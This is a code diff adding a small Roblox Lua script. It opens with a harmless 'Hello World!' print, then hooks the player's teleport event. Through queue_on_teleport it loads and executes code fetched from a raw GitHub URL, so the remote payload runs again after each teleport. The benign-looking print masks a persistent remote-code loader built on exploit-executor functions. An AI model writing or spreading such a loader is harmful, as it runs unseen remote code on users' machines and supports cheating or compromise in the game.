@@ -1,0 +1,5 @@
+print("Hello World!")
+
+game.Players.LocalPlayer.OnTeleport:Connect(function(State)
+    queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/skiddyshit/dd/refs/heads/main/lold"))()')
+end)
